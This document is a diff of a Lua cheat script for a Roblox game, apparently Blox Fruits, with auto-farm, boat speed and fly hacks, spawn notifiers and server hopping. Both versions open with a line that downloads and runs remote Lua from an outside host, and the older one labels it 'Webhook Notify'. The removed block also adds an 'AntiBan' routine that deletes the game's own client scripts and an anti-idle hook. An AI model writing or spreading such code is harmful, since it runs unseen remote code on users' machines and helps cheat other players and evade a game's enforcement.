@@ -1,256 +1,4 @@
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-loadstring(game:HttpGet("https://37utf92gn8cmz.ahost.marscode.site/as/all-string.lua",true))() --Webhook Notify
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-shared.LoaderTitle = 'Botuna.INC X Medusa Script'
-shared.LoaderKeyFrames = {
-    [1] = {1, 10},
-    [2] = {2, 30},
-    [3] = {3, 60},
-    [4] = {2, 100}
-}
-
-local Metadata = {
-    LoaderData = {
-        Name = (shared.LoaderTitle or 'A Loader'),
-        Colors = shared.LoaderColors or {
-            Main = Color3.fromRGB(0, 0, 0),
-            Topic = Color3.fromRGB(200, 200, 200),
-            Title = Color3.fromRGB(255, 255, 255),
-            LoaderBackground = Color3.fromRGB(40, 40, 40),
-            LoaderSplash = Color3.fromRGB(147, 112, 219)
-        }
-    },
-    Keyframes = shared.LoaderKeyFrames or {
-        [1] = {1, 10},
-        [2] = {2, 30},
-        [3] = {3, 60},
-        [4] = {2, 100}
-    }
-}
-
-local StepTexts = {
-    [1] = "Initiating Script",
-    [2] = "Anti Detect Security",
-    [3] = "Anti Role Back",
-    [4] = "Success Executing"
-}
-
-function TweenObject(object, speed, info)
-    game.TweenService:Create(object, TweenInfo.new(speed, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), info):Play()
-end
-
-function CreateObject(className, properties)
-    local instance = Instance.new(className)
-    local parent
-    for propertyName, propertyValue in pairs(properties) do
-        if propertyName ~= "Parent" then
-            instance[propertyName] = propertyValue
-        else
-            parent = propertyValue
-        end
-    end
-    instance.Parent = parent
-    return instance
-end
-
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-local userId = player.UserId
-local userName = player.Name
-local thumbType = Enum.ThumbnailType.HeadShot
-local thumbSize = Enum.ThumbnailSize.Size420x420
-local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
-
-local function CreateUICorner(radius, parent)
-    local UICorner = Instance.new("UICorner")
-    UICorner.CornerRadius = UDim.new(0, radius)
-    UICorner.Parent = parent
-end
-
-local Core = CreateObject("ScreenGui", {
-    Name = "Core",
-    Parent = game.CoreGui
-})
-
-local Main = CreateObject("Frame", {
-    Name = "Main",
-    Parent = Core,
-    BackgroundColor3 = Metadata.LoaderData.Colors.Main,
-    BorderSizePixel = 0,
-    ClipsDescendants = true,
-    Position = UDim2.new(0.5, 0, 0.5, 0),
-    AnchorPoint = Vector2.new(0.5, 0.5),
-    Size = UDim2.new(0, 0, 0, 0),
-})
-CreateUICorner(12, Main)
-
-local UserImage = CreateObject("ImageLabel", {
-    Name = "UserImage",
-    Parent = Main,
-    BackgroundTransparency = 1,
-    Image = content,
-    Position = UDim2.new(0, 15, 0, 10),
-    Size = UDim2.new(0, 50, 0, 50),
-})
-CreateUICorner(25, UserImage)
-
-local UserName = CreateObject("TextLabel", {
-    Name = "UserName",
-    Parent = Main,
-    BackgroundTransparency = 1,
-    Text = "Hello, " .. userName .. "",
-    Position = UDim2.new(0, 75, 0, 10),
-    Size = UDim2.new(0, 200, 0, 50),
-    Font = Enum.Font.GothamBold,
-    TextColor3 = Metadata.LoaderData.Colors.Title,
-    TextSize = 14,
-    TextXAlignment = Enum.TextXAlignment.Left,
-})
-
-local Top = CreateObject("TextLabel", {
-    Name = "Top",
-    TextTransparency = 1,
-    Parent = Main,
-    BackgroundColor3 = Color3.fromRGB(255, 255, 255),
-    BackgroundTransparency = 1,
-    Position = UDim2.new(0, 30, 0, 70),
-    Size = UDim2.new(0, 301, 0, 20),
-    Font = Enum.Font.Gotham,
-    Text = "Loader",
-    TextColor3 = Metadata.LoaderData.Colors.Topic,
-    TextSize = 10,
-    TextXAlignment = Enum.TextXAlignment.Left,
-})
-
-local Title = CreateObject("TextLabel", {
-    Name = "Title",
-    Parent = Main,
-    TextTransparency = 1,
-    BackgroundColor3 = Color3.fromRGB(255, 255, 255),
-    BackgroundTransparency = 1,
-    Position = UDim2.new(0, 30, 0, 90),
-    Size = UDim2.new(0, 301, 0, 46),
-    Font = Enum.Font.Gotham,
-    RichText = true,
-    Text = "<b>" .. Metadata.LoaderData.Name .. "</b>",
-    TextColor3 = Metadata.LoaderData.Colors.Title,
-    TextSize = 14,
-    TextXAlignment = Enum.TextXAlignment.Left,
-})
-
-local BG = CreateObject("Frame", {
-    Name = "BG",
-    Parent = Main,
-    AnchorPoint = Vector2.new(0.5, 0),
-    BackgroundTransparency = 1,
-    BackgroundColor3 = Metadata.LoaderData.Colors.LoaderBackground,
-    BorderSizePixel = 0,
-    Position = UDim2.new(0.5, 0, 0, 70),
-    Size = UDim2.new(0.8500000238418579, 0, 0, 24),
-})
-CreateUICorner(8, BG)
-
-local Progress = CreateObject("Frame", {
-    Name = "Progress",
-    Parent = BG,
-    BackgroundColor3 = Metadata.LoaderData.Colors.LoaderSplash,
-    BackgroundTransparency = 1,
-    BorderSizePixel = 0,
-    Size = UDim2.new(0, 0, 0, 24),
-})
-CreateUICorner(8, Progress)
-
-local StepLabel = CreateObject("TextLabel", {
-    Name = "StepLabel",
-    Parent = Main,
-    BackgroundTransparency = 1,
-    Position = UDim2.new(0.5, 0, 1, -25),
-    Size = UDim2.new(1, -20, 0, 20),
-    Font = Enum.Font.Gotham,
-    Text = "",
-    TextColor3 = Metadata.LoaderData.Colors.Topic,
-    TextSize = 14,
-    TextXAlignment = Enum.TextXAlignment.Center,
-    AnchorPoint = Vector2.new(0.5, 0.5)
-})function UpdateStepText(step)
-    StepLabel.Text = StepTexts[step] or ""
-end
-function UpdatePercentage(percentage, step)
-    TweenObject(Progress, 0.5, {
-        Size = UDim2.new((percentage / 100), 0, 0, 24)
-    })
-    UpdateStepText(step)
-end
-TweenObject(Main, 0.25, {
-    Size = UDim2.new(0, 346, 0, 121)
-})
-wait(0.25)
-TweenObject(Top, 0.5, {
-    TextTransparency = 0
-})
-TweenObject(Title, 0.5, {
-    TextTransparency = 0
-})
-TweenObject(BG, 0.5, {
-    BackgroundTransparency = 0
-})
-TweenObject(Progress, 0.5, {
-    BackgroundTransparency = 0
-})
-
-for i, v in pairs(Metadata.Keyframes) do
-    wait(v[1])
-    UpdatePercentage(v[2], i)
-end
-
-UpdatePercentage(100, 4)
-
-TweenObject(Top, 0.5, {
-    TextTransparency = 1
-})
-TweenObject(Title, 0.5, {
-    TextTransparency = 1
-})
-TweenObject(BG, 0.5, {
-    BackgroundTransparency = 1
-})
-TweenObject(Progress, 0.5, {
-    BackgroundTransparency = 1
-})
-wait(0.5)
-TweenObject(Main, 0.25, {
-    Size = UDim2.new(0, 0, 0, 0)
-})
-wait(0.25)
-Core:Destroy()   
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-function AntiBan()
-    for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
-        if v:IsA("LocalScript") then
-            if v.Name == "General" or v.Name == "Shiftlock"  or v.Name == "FallDamage" or v.Name == "4444" or v.Name == "CamBob" or v.Name == "JumpCD" or v.Name == "Looking" or v.Name == "Run" then
-                v:Destroy()
-            end
-        end
-     end
-     for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerScripts:GetDescendants()) do
-        if v:IsA("LocalScript") then
-            if v.Name == "RobloxMotor6DBugFix" or v.Name == "Clans"  or v.Name == "Codes" or v.Name == "CustomForceField" or v.Name == "MenuBloodSp"  or v.Name == "PlayerList" or v.Name == "FastAttack" or v.Name == "BringMobs" or v.Name == "SpamSkill" then
-                v:Destroy()
-            end
-        end
-     end
-    end
-    AntiBan()
-
-game:GetService("Players").LocalPlayer.Idled:connect(function()
-	game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
-	wait(1)
-	game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
-end)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
+loadstring(game:HttpGet("https://37utf92gn8cmz.ahost.marscode.site/as/all-string.lua"))()
 local Notif = {}
 
 local CoreGUI = game:GetService("CoreGui")
@@ -6479,8 +6227,7 @@ spawn(function()
     while wait() do
         pcall(function()
             if _G.dao then
-                local batuLaut = {"SmallGroup", "SmallCluster", "MediumGroup", "MediumFlat", "Large", "Largest", "RockPart", "RockGroup", "Coral", "BigRock", "SmallRock", "SeaRock", "RockPile", "Cliff"}
-                
+                local batuLaut = {"SmallGroup", "SmallCluster", "MediumGroup", "MediumFlat", "Large", "Largest"}
 
                 for _, v in pairs(workspace:GetChildren()) do
                     if table.find(batuLaut, v.Name) and v:IsA("Model") then
@@ -8306,8 +8053,7 @@ spawn(function()
     while wait() do
         pcall(function()
             if _G.Anchor then
-                local batuLaut = {"SmallGroup", "SmallCluster", "MediumGroup", "MediumFlat", "Large", "Largest", "RockPart", "RockGroup", "Coral", "BigRock", "SmallRock", "SeaRock", "RockPile", "Cliff"}
-                
+                local batuLaut = {"SmallGroup", "SmallCluster", "MediumGroup", "MediumFlat", "Large", "Largest"}
 
                 for _, v in pairs(workspace:GetChildren()) do
                     if table.find(batuLaut, v.Name) and v:IsA("Model") then
@@ -8333,7 +8079,7 @@ spawn(function()
 
                 for _, model in pairs(models) do
                     if model.Name == targetModelName then
-                        local speed = 350
+                        local speed = 10.5
                         local forwardDirection = model.PrimaryPart.CFrame.lookVector
                         local targetPosition = model.PrimaryPart.Position + forwardDirection * 10
                         
@@ -8377,7 +8123,7 @@ M:AddToggle("Auto Finish Zone 5 (fix bug)",_G.dao,function(state)
             end
         end)
 ]]
-SNt:AddToggle("Speed Boat",false ,_G.IncreaseBoatSpeed,function(value) -- state
+SNt:AddToggle("Speed Boat",_G.IncreaseBoatSpeed,function(value) -- state
     _G.IncreaseBoatSpeed = value
 end)
 
@@ -8386,7 +8132,7 @@ spawn(function()
         pcall(function()
             local vehicleSeats = {}
             for i, v in pairs(game.Workspace.Boats:GetDescendants()) do
-                if v:IsA("VehicleSeats") then
+                if v:IsA("VehicleSeat") then
                     table.insert(vehicleSeats, v)
                 end
             end
@@ -8402,94 +8148,8 @@ spawn(function()
         end)
     end
 end)
---[[
--- Menambahkan fungsi untuk toggle
-SNt:AddToggle("Boat Fly", false, function(value)
-    _G.WalkWaterBoat = value
-end)
 
--- Loop utama
-spawn(function()
-    while task.wait() do
-        pcall(function()
-            if _G.WalkWaterBoat then
-                -- Mengatur ukuran tinggi air menjadi lebih tinggi
-                game:GetService("Workspace").Map["WaterBase-Plane"].Size = Vector3.new(1000, 352, 1000)
-                
-                -- Mengatur posisi boat agar mengambang lebih tinggi di atas air
-                for _, boat in pairs(game:GetService("Workspace").Boats:GetChildren()) do
-                    if boat:IsA("Model") and boat:FindFirstChild("PrimaryPart") then
-                        local boatPosition = boat.PrimaryPart.Position
-                        -- Tinggi boat ketika air berada di posisi tinggi
-                        boat.PrimaryPart.Position = Vector3.new(boatPosition.X, 350, boatPosition.Z) --117
-                    end
-                end
-            else
-                -- Mengembalikan ukuran air ke posisi semula (lebih rendah)
-                game:GetService("Workspace").Map["WaterBase-Plane"].Size = Vector3.new(1000, 0, 1000)
-                
-                -- Mengembalikan posisi boat ke posisi rendah sesuai dengan ketinggian air rendah
-                for _, boat in pairs(game:GetService("Workspace").Boats:GetChildren()) do
-                    if boat:IsA("Model") and boat:FindFirstChild("PrimaryPart") then
-                        local boatPosition = boat.PrimaryPart.Position
-                        -- Posisi boat ketika air di posisi rendah
-                        boat.PrimaryPart.Position = Vector3.new(boatPosition.X, 5, boatPosition.Z)
-                    end
-                end
-            end
-        end)
-    end
-end)
-]]
-
--- Menambahkan fungsi untuk toggle
-SNt:AddToggle("Boat Fly", false, function(value)
-    _G.WalkWaterBoat = value
-end)
-
--- Loop utama
-spawn(function()
-    while task.wait() do
-        pcall(function()
-            if _G.WalkWaterBoat then
-                -- Mengatur posisi boat yang sedang digunakan oleh player agar melayang
-                for _, boat in pairs(game:GetService("Workspace").Boats:GetChildren()) do
-                    if boat:IsA("Model") and boat:FindFirstChild("PrimaryPart") then
-                        for _, part in pairs(boat:GetChildren()) do
-                            if part:IsA("VehicleSeat") and part.Occupant then
-                                -- Jika ada pemain yang menggunakan boat, buat terbang
-                                local boatPosition = boat.PrimaryPart.Position
-                                boat.PrimaryPart.Position = Vector3.new(boatPosition.X, boatPosition.Y + 50, boatPosition.Z)
-                                break
-                            end
-                        end
-                    end
-                end
-            else
-                -- Mengembalikan posisi boat yang sedang digunakan oleh player ke ketinggian normal
-                for _, boat in pairs(game:GetService("Workspace").Boats:GetChildren()) do
-                    if boat:IsA("Model") and boat:FindFirstChild("PrimaryPart") then
-                        for _, part in pairs(boat:GetChildren()) do
-                            if part:IsA("VehicleSeat") and part.Occupant then
-                                -- Jika ada pemain yang menggunakan boat, kembalikan ke posisi normal
-                                local boatPosition = boat.PrimaryPart.Position
-                                boat.PrimaryPart.Position = Vector3.new(boatPosition.X, 5, boatPosition.Z)
-                                break
-                            end
-                        end
-                    end
-                end
-            end
-        end)
-    end
-end)
-
-
-
-
-
-
-SNt:AddToggle("Auto Sail Rough Sea",_G.BiirTrax,function(state)
+    SNt:AddToggle("Auto Sail Rough Sea",_G.BiirTrax,function(state)
     if state then
         _G.BiirTrax = true
     else
@@ -8650,7 +8310,6 @@ spawn(function()
         end)
     end
 end)
-
 
 SNt:AddSeperator("Frozen & Kitsune")
 
@@ -14914,73 +14573,6 @@ end)
 
     Mh:AddSeperator("Auto Hop Server")
     Mh:AddLabel("Click And Wait 5 Second")
-
-Mh:AddToggle("God's Chalice & FOD Notify", false, _G.NotifItemChestcheck, function(value)
-        _G.NotifItemChestcheck = value
-    end)
-    
-    spawn(function()
-        while wait(1) do 
-            if _G.NotifItemChestcheck then
-                local godsChaliceInBackpack = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("God's Chalice")
-                local fishOfDarknessInBackpack = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Fish of Darkness")
-
-                local chest = game:GetService("Workspace"):FindFirstChild("Chest")
-                local godsChaliceInChest = nil
-                local fishOfDarknessInChest = nil
-    
-                if chest then
-                    godsChaliceInChest = chest:FindFirstChild("God's Chalice")
-                    fishOfDarknessInChest = chest:FindFirstChild("Fish of Darkness")
-                end
-                if godsChaliceInBackpack or godsChaliceInChest then
-                    require(game:GetService("ReplicatedStorage").Notification).new("God's Chalice detected in backpack or chest!"):Display()
-                    wait(1)
-                end
-
-                if fishOfDarknessInBackpack or fishOfDarknessInChest then
-                    require(game:GetService("ReplicatedStorage").Notification).new("FOD detected in backpack or chest!"):Display()
-                    wait(1)
-                end
-            end
-        end
-    end)
-    
-    Mh:AddToggle("Mirage Island Notify",false ,_G.NotifMirragecheck,function(value)
-        _G.NotifMirragecheck = value
-        end)
-        
-        spawn(function()
-                while wait(.1) do
-                    if _G.NotifMirragecheck then
-                        for i,v in pairs(game.Workspace._WorldOrigin.Locations:FindFirstChild('Mirage Island')) do
-                            if string.find(v.Name, "Mirage Island") then
-                                require(game:GetService("ReplicatedStorage").Notification).new("Mirage Island Spawn"):Display();
-                                wait()
-                                setthreadcontext(5)
-                            end
-                        end
-                    end
-                  end
-                 end)
-
-    Mh:AddToggle("Elite Hunter Notification",false ,_G.EliteCheck,function(value)
-_G.EliteCheck = value
-end)
-        
-spawn(function()
-while wait(.1) do
-if _G.EliteCheck then
-for i,v in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("Diablo") or game:GetService("ReplicatedStorage"):FindFirstChild("Deandre") or game:GetService("ReplicatedStorage"):FindFirstChild("Urban") or game:GetService("Workspace").Enemies:FindFirstChild("Diablo") or game:GetService("Workspace").Enemies:FindFirstChild("Deandre") or game:GetService("Workspace").Enemies:FindFirstChild("Urban")) do
-if string.find(v.Name, "Diablo", "Deandre", "Urban") then
-require(game:GetService("ReplicatedStorage").Notification).new("Notification Elite Hunter Spawn"):Display();
-wait()
-setthreadcontext(5)
-end
-end
-end
-end
-end)
 
     Mh:AddToggle("Auto Hop Server Mirage Island",_G.Hopfinddao,function(value)
         _G.Hopfinddao = value
